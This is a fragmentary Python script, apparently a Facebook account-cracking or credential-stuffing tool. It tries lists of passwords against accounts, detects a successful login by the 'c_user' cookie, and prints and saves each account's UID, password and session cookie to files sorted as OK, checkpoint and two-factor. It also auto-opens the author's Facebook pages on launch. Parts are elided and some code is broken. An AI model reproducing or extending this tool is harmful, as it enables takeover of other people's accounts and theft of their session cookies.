mport os
os.system('am start https://www.facebook.com/profile.php?id=100057363322158')
#- SCRIPT UTA LE 
...
oks = []
twf = []
os.system('xdg-open https://facebook.com/groups/632909141516815/?ref=share')
os.system('xdg-open https://facebook.com/groups/550928699368927/?ref=share')
...

  ...
  AUTHOR   :   Mr.General 
  FACEBOOK :   https://www.facebook.com/profile.php?id=100057363322158
  GITHUB    :   Moeen
  LIFE STATUS  :  Real Madrid 🦅🔥
  TOOL STATUS :  FRER                         
\033[1;91m=========================================================="""
...
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mMr.General -OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mMr.GeneralCP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mMr.General-2F.txt' %
              (H, P, str(len(twf))))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[G e n e r a l-OK]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/G e n e r a l--OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[G e n e r a l-CP]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/G e n e r a l-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
